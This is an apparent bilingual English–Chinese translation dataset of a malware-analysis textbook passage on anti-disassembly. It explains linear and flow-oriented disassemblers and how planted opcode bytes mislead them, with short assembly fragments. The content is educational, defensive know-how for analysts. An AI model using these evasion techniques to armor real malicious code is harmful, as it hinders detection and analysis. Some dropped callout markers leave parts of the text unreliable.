  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**A N T I - D I S A S S E M B L Y**'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: '**反反汇编**'
- en: '*Anti-disassembly* uses specially crafted code or data in a program to cause
    disassembly analysis tools to produce'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: '*反反汇编*通过在程序中使用特别定制的代码或数据来导致反汇编分析工具产生'
- en: an incorrect program listing. This technique is crafted
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 一个错误的程序列表。这种技术是精心制作的
- en: by malware authors manually, with a separate tool in
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 由恶意软件作者手动进行，使用一个单独的工具
- en: the build and deployment process or interwoven into
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 构建和部署过程或交织在一起
- en: their malware’s source code.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 他们的恶意软件源代码。
- en: 'All malware is designed with a particular goal in mind: keystroke logging,
    backdoor access, using a target system to send excessive email to cripple servers,
    and so on. Malware authors often go beyond this basic functionality to implement
    specific techniques to hide from the user or system administrator, using rootkits
    or process injection, or to otherwise thwart analysis and detection.'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 所有恶意软件都是针对特定目标设计的：键盘记录、后门访问、使用目标系统发送大量邮件以破坏服务器等。恶意软件作者经常超越这种基本功能，以实现特定的技术来隐藏用户或系统管理员，使用rootkits或进程注入，或者以其他方式阻止分析和检测。
- en: Malware authors use anti-disassembly techniques to delay or prevent analysis
    of malicious code. Any code that executes successfully can be reverse-engineered,
    but by armoring their code with anti-disassembly and anti-debugging techniques,
    malware authors increase the level of skill required of the malware analyst. The
    time-sensitive investigative process is hindered by
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件作者使用反反汇编技术来延迟或阻止恶意代码的分析。任何成功执行的代码都可以被逆向工程，但通过使用反反汇编和反调试技术来加固他们的代码，恶意软件作者增加了恶意软件分析师所需的技能水平。时间敏感的调查过程受到阻碍
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: the malware analyst’s inability to understand the malware’s capabilities, derive
    valuable host and network signatures, and develop decoding algorithms. These additional
    layers of protection may exhaust the in-house skill level at many organizations
    and require expert consultants or large research project levels of effort to reverse-engineer.
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件分析师无法理解恶意软件的功能，推导出有价值的宿主和网络签名，以及开发解码算法。这些额外的保护层可能会耗尽许多组织内部的技能水平，并需要专家顾问或大型研究项目级别的工作来进行逆向工程。
- en: In addition to delaying or preventing human analysis, anti-disassembly is also
    effective at preventing certain automated analysis techniques. Many malware similarity
    detection algorithms and antivirus heuristic engines employ disassembly analysis
    to identify or classify malware. Any manual or automated process that uses individual
    program instructions will be susceptible to the anti-analysis techniques described
    in this chapter.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 除了延迟或阻止人工分析外，反汇编技术也有效地防止了某些自动化分析技术。许多恶意软件相似性检测算法和反病毒启发式引擎使用反汇编分析来识别或分类恶意软件。任何使用单个程序指令的手动或自动化过程都将受到本章中描述的反分析技术的攻击。
- en: '**Understanding Anti-Disassembly**'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: '**理解反汇编**'
- en: Disassembly is not a simple problem. Sequences of executable code can have multiple
    disassembly representations, some that may be invalid and obscure the real functionality
    of the program. When implementing anti-disassembly, the malware author creates
    a sequence that tricks the disassembler into showing a list of instructions that
    differ from those that will be executed.
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编不是一个简单的问题。可执行代码序列可以有多个反汇编表示，其中一些可能是无效的，并掩盖了程序的真实功能。当实现反汇编时，恶意软件作者创建了一个序列，欺骗反汇编器显示一个与将要执行的指令不同的指令列表。
- en: 'Anti-disassembly techniques work by taking advantage of the assumptions and
    limitations of disassemblers. For example, disassemblers can only represent each
    byte of a program as part of one instruction at a time. If the disassembler is
    tricked into disassembling at the wrong offset, a valid instruction could be hidden
    from view. For example, examine the following fragment of disassembled code:'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编技术通过利用反汇编器的假设和限制来工作。例如，反汇编器一次只能将程序的每个字节表示为一条指令的一部分。如果反汇编器被欺骗在错误的偏移量处进行反汇编，一个有效的指令可能会被隐藏。例如，检查以下反汇编代码片段：
- en: jmp short near ptr loc_2+1
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: jmp short near ptr loc_2+1
- en: ; ---------------------------------------------------------------------------
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: ; ---------------------------------------------------------------------------
- en: 'loc_2: ; CODE XREF: seg000:00000000j call near ptr 15FF2A71h '
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_2: ; CODE XREF: seg000:00000000j call near ptr 15FF2A71h '
- en: or [ecx], dl
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: or [ecx], dl
- en: inc eax
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: inc eax
- en: ; ---------------------------------------------------------------------------
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: ; ---------------------------------------------------------------------------
- en: db 0
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: db 0
- en: This fragment of code was disassembled using the linear-disassembly technique,
    and the result is inaccurate. Reading this code, we miss the piece of information
    that its author is trying to hide. We see what appears to be a call instruction,
    but the target of the call is nonsensical . The first instruction is a jmp instruction
    whose target is invalid because it falls in the middle of the next instruction.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 这段代码使用线性反汇编技术反汇编，结果不准确。阅读这段代码，我们会错过作者试图隐藏的信息。我们看到的是一个看似调用指令，但调用的目标毫无意义 。第一条指令是一个
    jmp 指令，其目标无效，因为它位于下一条指令的中间。
- en: '**328**'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: '**328**'
- en: Chapter 15
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'Now examine the same sequence of bytes disassembled with a different strategy:'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 现在检查使用不同策略反汇编的相同字节序列：
- en: jmp short loc_3
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: jmp short loc_3
- en: ; ---------------------------------------------------------------------------
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: ; ---------------------------------------------------------------------------
- en: db 0E8h
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: db 0E8h
- en: ; ---------------------------------------------------------------------------
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: ; ---------------------------------------------------------------------------
- en: 'loc_3: ; CODE XREF: seg000:00000000j push 2Ah'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_3: ; CODE XREF: seg000:00000000j push 2Ah'
- en: call Sleep 
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: call Sleep 
- en: This fragment reveals a different sequence of assembly mnemonics, and it appears
    to be more informative. Here, we see a call to the API function Sleep at . The
    target of the first jmp instruction is now properly represented, and we can see
    that it jumps to a push instruction followed by the call to Sleep.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 这个片段揭示了不同的汇编指令序列，看起来更有信息量。在这里，我们看到在  处调用了 API 函数 Sleep。第一个 jmp 指令的目标现在得到了适当的表示，我们可以看到它跳转到一个
    push 指令，然后是调用 Sleep。
- en: The byte on the third line of this example is 0xE8, but this byte is not executed
    by the program because the jmp instruction skips over it.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 本例中第三行的字节是 0xE8，但这个字节不会被程序执行，因为 jmp 指令跳过了它。
- en: This fragment was disassembled with a flow-oriented disassembler, rather than
    the linear disassembler used previously. In this case, the flow-oriented disassembler
    was more accurate because its logic more closely mirrored the real program and
    did not attempt to disassemble any bytes that were not part of execution flow.
    We’ll discuss linear and flow-oriented disassembly in more detail in the next
    section.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 这个片段使用流程导向的反汇编器反汇编，而不是之前使用的线性反汇编器。在这种情况下，流程导向的反汇编器更准确，因为它的逻辑更接近真实程序，并且没有尝试反汇编不属于执行流的任何字节。我们将在下一节更详细地讨论线性和非流程导向的反汇编。
- en: So, disassembly is not as simple as you may have thought. The disassembly examples
    show two completely different sets of instructions for the same set of bytes.
    This demonstrates how anti-disassembly can cause the disassembler to produce an
    inaccurate set of instructions for a given range of bytes.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，反汇编并不像你可能想象的那样简单。反汇编示例显示了同一组字节的两个完全不同的指令集。这展示了反汇编技术如何导致反汇编器为给定字节范围生成一组不准确的指令。
- en: Some anti-disassembly techniques are generic enough to work on most disassemblers,
    while some target specific products.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 一些反汇编技术足够通用，可以在大多数反汇编器上工作，而一些则针对特定产品。
- en: '**Defeating Disassembly Algorithms**'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: '**击败反汇编算法**'
- en: Anti-disassembly techniques are born out of inherent weaknesses in disassembler
    algorithms. Any disassembler must make certain assumptions in order to present
    the code it is disassembling clearly. When these assumptions fail, the malware
    author has an opportunity to fool the malware analyst.
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编技术源于反汇编算法的固有弱点。任何反汇编器都必须做出某些假设，以便清楚地展示它正在反汇编的代码。当这些假设失败时，恶意软件作者有机会欺骗恶意软件分析师。
- en: 'There are two types of disassembler algorithms: linear and flow-oriented.'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编算法有两种类型：线性和非流程导向。
- en: Linear disassembly is easier to implement, but it’s also more error-prone.
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 线性反汇编更容易实现，但也更易出错。
- en: '***Linear Disassembly***'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: '***线性反汇编***'
- en: The *linear-disassembly* strategy iterates over a block of code, disassembling
    one instruction at a time linearly, without deviating. This basic strategy is
    employed by disassembler writing tutorials and is widely used by debuggers.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: '*线性反汇编*策略遍历一段代码，一次线性地反汇编一条指令，不偏离。这种基本策略被反汇编编写教程采用，并被调试器广泛使用。'
- en: Anti-Disassembly
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编技术
- en: '**329**'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: '**329**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Linear disassembly uses the size of the disassembled instruction to determine
    which byte to disassemble next, without regard for flow-control instructions.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 线性反汇编使用反汇编指令的大小来确定下一个要反汇编的字节，而不考虑流程控制指令。
- en: 'The following code fragment shows the use of the disassembly library libdisasm
    ( *http://sf.net/projects/bastard/files/libdisasm/*) to implement a crude disassembler
    in a handful of lines of C using linear disassembly: char buffer[BUF_SIZE];'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 以下代码片段展示了使用反汇编库libdisasm (*http://sf.net/projects/bastard/files/libdisasm/*)
    在几行C代码中实现一个简单的反汇编器，使用线性反汇编：char buffer[BUF_SIZE];
- en: int position = 0;
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: int position = 0;
- en: while (position < BUF_SIZE) {
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: while (position < BUF_SIZE) {
- en: x86_insn_t insn;
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: x86_insn_t insn;
- en: int size = x86_disasm(buf, BUF_SIZE, 0, position, &insn); if (size != 0) {
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: int size = x86_disasm(buf, BUF_SIZE, 0, position, &insn); if (size != 0) {
- en: char disassembly_line[1024];
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: char disassembly_line[1024];
- en: x86_format_insn(&insn, disassembly_line, 1024, intel_syntax); printf("%s\n",
    disassembly_line);
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: x86_format_insn(&insn, disassembly_line, 1024, intel_syntax); printf("%s\n",
    disassembly_line);
- en: position += size;
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: position += size;
- en: '} else {'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: '} else {'
- en: /* invalid/unrecognized instruction */
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: /* 无效/未识别的指令 */
- en: position++;
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: position++;
- en: '}'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: x86_cleanup();
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: x86_cleanup();
- en: In this example, a buffer of data named buffer contains instructions to be disassembled.
    The function x86_disasm will populate a data structure with the specifics of the
    instruction it just disassembled and return the size of the instruction. The loop
    increments the position variable by the size value  if a valid instruction was
    disassembled; otherwise, it increments by one .
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，一个名为buffer的数据缓冲区包含要反汇编的指令。函数x86_disasm将填充一个数据结构，其中包含它刚刚反汇编的指令的详细信息，并返回指令的大小。循环通过大小值递增位置变量，如果成功反汇编了一个有效的指令；否则，递增一。
- en: This algorithm will disassemble most code without a problem, but it will introduce
    occasional errors even in nonmalicious binaries. The main drawback to this method
    is that it will disassemble too much code. The algorithm will keep blindly disassembling
    until the end of the buffer, even if flow-control instructions will cause only
    a small portion of the buffer to execute.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 此算法将无问题地反汇编大多数代码，但在非恶意二进制文件中偶尔也会引入错误。这种方法的主要缺点是它会反汇编过多的代码。算法会盲目地反汇编，直到缓冲区末尾，即使只有一小部分缓冲区会被流程控制指令执行。
- en: In a PE-formatted executable file, the executable code is typically contained
    in a single section. It is reasonable to assume that you could get away with just
    applying this linear-disassembly algorithm to the .text section containing the
    code, but the problem is that the code section of nearly all binaries will also
    contain data that isn’t instructions.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 在PE格式的可执行文件中，可执行代码通常包含在单个部分中。可以合理地假设，您只需将此线性反汇编算法应用于包含代码的.text部分，但问题是几乎所有二进制文件的代码部分也会包含不是指令的数据。
- en: One of the most common types of data items found in a code section is a pointer
    value, which is used in a table-driven switch idiom. The following disassembly
    fragment (from a nonlinear disassembler) shows a function that contains switch
    pointers immediately following the function code.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 在代码部分最常见的数据项类型之一是指针值，它在表驱动的switch习语中使用。以下反汇编片段（来自非线性反汇编器）显示了一个包含switch指针紧随函数代码的功能。
- en: '**330**'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: '**330**'
- en: Chapter 15
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: jmp ds:off_401050[eax*4] ; switch jump
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: jmp ds:off_401050[eax*4] ; switch跳转
- en: ; switch cases omitted ...
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: ; 跳转情况省略...
- en: xor eax, eax
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, eax
- en: pop esi
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: pop esi
- en: retn
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: retn
- en: ; ---------------------------------------------------------------------------
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: ; ---------------------------------------------------------------------------
- en: 'off_401050 dd offset loc_401020 ; DATA XREF: _main+19r dd offset loc_401027
    ; jump table for switch statement dd offset loc_40102E'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 'off_401050 dd offset loc_401020 ; 数据引用: _main+19r dd offset loc_401027 ; switch语句的跳转表
    dd offset loc_40102E'
- en: dd offset loc_401035
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: dd offset loc_401035
- en: The last instruction in this function is retn. In memory, the bytes immediately
    following the retn instruction are the pointer values beginning with 401020 at
    , which in memory will appear as the byte sequence 20 10 40 00
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 这个函数中的最后一条指令是retn。在内存中，紧随retn指令之后的字节是起始地址为401020的指针值，在内存中表现为字节序列20 10 40 00
- en: 'in hex. These four pointer values shown in the code fragment make up 16 bytes
    of data inside the .text section of this binary. They also happen to disassemble
    to valid instructions. The following disassembly fragment would be produced by
    a linear-disassembly algorithm when it continues disassembling instructions beyond
    the end of the function:'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 以十六进制表示。这些代码片段中显示的四个指针值组成了这个二进制文件.text部分中的16字节数据。它们也恰好可以反汇编成有效的指令。以下反汇编片段是当线性反汇编算法在函数结束之后继续反汇编指令时产生的：
- en: and [eax],dl
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: and [eax],dl
- en: inc eax
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: inc eax
- en: add [edi],ah
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: add [edi],ah
- en: adc [eax+0x0],al
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: adc [eax+0x0],al
- en: adc cs:[eax+0x0],al
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: adc cs:[eax+0x0],al
- en: xor eax,0x4010
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax,0x4010
- en: Many of instructions in this fragment consist of multiple bytes. The key way
    that malware authors exploit linear-disassembly algorithms lies in plant-ing data
    bytes that form the opcodes of multibyte instructions. For example, the standard
    local call instruction is 5 bytes, beginning with the opcode 0xE8\.
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 这个片段中的许多指令由多个字节组成。恶意软件作者利用线性反汇编算法的关键方式在于植入构成多字节指令操作码的数据字节。例如，标准局部调用指令是5个字节，以操作码0xE8开始。
- en: If the 16 bytes of data that compose the switch table end with the value 0xE8,
    the disassembler would encounter the call instruction opcode and treat the next
    4 bytes as an operand to that instruction, instead of the beginning of the next
    function.
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 如果组成切换表的16字节数据以0xE8的值结束，反汇编器会遇到call指令操作码，并将接下来的4字节视为该指令的操作数，而不是下一个函数的开始。
- en: Linear-disassembly algorithms are the easiest to defeat because they are unable
    to distinguish between code and data.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 线性反汇编算法是最容易被击败的，因为它们无法区分代码和数据。
- en: '***Flow-Oriented Disassembly***'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: '**面向流程的反汇编**'
- en: A more advanced category of disassembly algorithms is the *flow-oriented disassembler*.
    This is the method used by most commercial disassemblers such as IDA Pro.
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 更高级的反汇编算法类别是*面向流程的反汇编器*。这是大多数商业反汇编器（如IDA Pro）使用的方法。
- en: The key difference between flow-oriented and linear disassembly is that the
    disassembler doesn’t blindly iterate over a buffer, assuming the data is Anti-Disassembly
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 面向流程和线性反汇编之间的关键区别是反汇编器不会盲目地迭代缓冲区，假设数据是Anti-Disassembly
- en: '**331**'
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: '**331**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: nothing but instructions packed neatly together. Instead, it examines each instruction
    and builds a list of locations to disassemble.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 仅仅是整齐排列的指令。相反，它检查每条指令并构建一个要反汇编的位置列表。
- en: The following fragment shows code that can be disassembled correctly only with
    a flow-oriented disassembler.
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 以下片段展示了只有使用面向流程的反汇编器才能正确反汇编的代码。
- en: test eax, eax
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: test eax, eax
- en: jz short loc_1A
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: jz short loc_1A
- en: push Failed_string
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: push Failed_string
- en: call printf
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: call printf
- en: jmp short loc_1D
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: jmp short loc_1D
- en: ; ---------------------------------------------------------------------------
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: ; ---------------------------------------------------------------------------
- en: 'Failed_string: db ''Failed'',0'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 'Failed_string: db ''Failed'',0'
- en: ; ---------------------------------------------------------------------------
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: ; ---------------------------------------------------------------------------
- en: 'loc_1A: '
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_1A: '
- en: xor eax, eax
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, eax
- en: 'loc_1D:'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_1D:'
- en: retn
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: retn
- en: This example begins with a test and a conditional jump. When the flow-oriented
    disassembler reaches the conditional branch instruction jz at , it notes that
    at some point in the future it needs to disassemble the location loc_1A at .
    Because this is only a conditional branch, the instruction at 
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 此示例从测试和条件跳转开始。当面向流程的反汇编器到达条件分支指令jz在时，它会记录在未来的某个时刻需要反汇编loc_1A在的位置。因为这是一个条件分支，所以处的指令
- en: is also a possibility in execution, so the disassembler will disassemble this
    as well.
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 在执行中也是可能的，因此反汇编器也会反汇编这个指令。
- en: The lines at  and  are responsible for printing the string Failed to the screen.
    Following this is a jmp instruction at . The flow-oriented disassembler will
    add the target of this, loc_1D, to the list of places to disassemble in the future.
    Since jmp is unconditional, the disassembler will not automatically disassemble
    the instruction immediately following in memory. Instead, it will step back and
    check the list of places it noted previously, such as loc_1A, and disassemble
    starting from that point.
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 在和处的行负责将字符串Failed打印到屏幕上。随后是一个在处的jmp指令。面向流程的反汇编器会将这个指令的目标loc_1D添加到未来要反汇编的位置列表中。由于jmp是无条件的，反汇编器不会自动反汇编内存中紧随其后的指令。相反，它会退回并检查之前记录的位置列表，例如loc_1A，并从该点开始反汇编。
- en: In contrast, when a linear disassembler encounters the jmp instruction, it will
    continue blindly disassembling instructions sequentially in memory, regardless
    of the logical flow of the code. In this case, the Failed string would be disassembled
    as code, inadvertently hiding the ASCII string and the last two instructions in
    the example fragment. For example, the following fragment shows the same code
    disassembled with a linear-disassembly algorithm.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 相比之下，当线性反汇编器遇到jmp指令时，它将盲目地按顺序在内存中反汇编指令，而不考虑代码的逻辑流程。在这种情况下，Failed字符串会被错误地反汇编为代码，无意中隐藏了示例片段中的ASCII字符串和最后两个指令。例如，以下片段展示了使用线性反汇编算法反汇编的相同代码。
- en: test eax, eax
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: test eax, eax
- en: jz short near ptr loc_15+5
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: jz short near ptr loc_15+5
- en: push Failed_string
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: push Failed_string
- en: call printf
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: call printf
- en: jmp short loc_15+9
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: jmp short loc_15+9
- en: 'Failed_string:'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 'Failed_string:'
- en: inc esi
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: inc esi
- en: popa
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: popa
- en: 'loc_15:'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_15:'
- en: imul ebp, [ebp+64h], 0C3C03100h
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: imul ebp, [ebp+64h], 0C3C03100h
- en: '**332**'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: '**332**'
- en: Chapter 15
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: In linear disassembly, the disassembler has no choice to make about which instructions
    to disassemble at a given time. Flow-oriented disassemblers make choices and assumptions.
    Though assumptions and choices might seem unnecessary, simple machine code instructions
    are complicated by the addition of problematic code aspects such as pointers,
    exceptions, and conditional branching.
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 在线性反汇编中，反汇编器在给定时间关于要反汇编哪些指令没有选择余地。面向流程的反汇编器会做出选择和假设。尽管假设和选择可能看似不必要，但简单的机器代码指令会因为添加了诸如指针、异常和条件分支等问题代码而变得复杂。
- en: 'Conditional branches give the flow-oriented disassembler a choice of two places
    to disassemble: the true or the false branch. In typical compiler-generated code,
    there would be no difference in output if the disassembler processes the true
    or false branch first. In handwritten assembly code and anti-disassembly code,
    however, the two branches can often produce different disassembly for the same
    block of code. When there is a conflict, most disassemblers trust their initial
    interpretation of a given location first. Most flow-oriented disassemblers will
    process (and thus trust) the false branch of any conditional jump first.'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 条件分支给面向流程的反汇编器提供了两个选择：真分支或假分支。在典型的编译器生成的代码中，如果反汇编器首先处理真分支或假分支，输出不会有差异。然而，在手工编写的汇编代码和反汇编代码中，这两个分支通常会对同一块代码产生不同的反汇编。当存在冲突时，大多数反汇编器首先信任给定位置的初始解释。大多数面向流程的反汇编器将首先处理（并因此信任）任何条件跳转的假分支。
- en: Figure 15-1 shows a sequence of bytes and their corresponding machine instructions.
    Notice the string hello in the middle of the instructions. When the program executes,
    this string is skipped by the call instruction, and its 6
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 图15-1显示了字节序列及其对应的机器指令。注意指令中间的字符串hello。当程序执行时，这个字符串会被call指令跳过，并且它的6
- en: bytes and NULL terminator are never executed as instructions.
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 字节和空终止符永远不会作为指令执行。
- en: CALL
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: CALL
- en: h e l l o
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: h e l l o
- en: POP RET
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: POP RET
- en: E8
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: E8
- en: '06'
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: '06'
- en: '00'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: '00'
- en: '00'
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: '00'
- en: '00'
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: '00'
- en: '68'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: '68'
- en: '65'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: '65'
- en: 6c
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 6c
- en: 6c
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 6c
- en: 6F
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 6F
- en: '00'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: '00'
- en: '58'
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: '58'
- en: C3
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: C3
- en: '*Figure 15-1: call instruction followed by a string*'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: '*图15-1：call指令后跟一个字符串*'
- en: The call instruction is another place where the disassembler must make a decision.
    The location being called is added to the future disassembly list, along with
    the location immediately after the call. Just as with the conditional jump instructions,
    most disassemblers will disassemble the bytes after the call instruction first
    and the called location later. In handwritten assembly, programmers will often
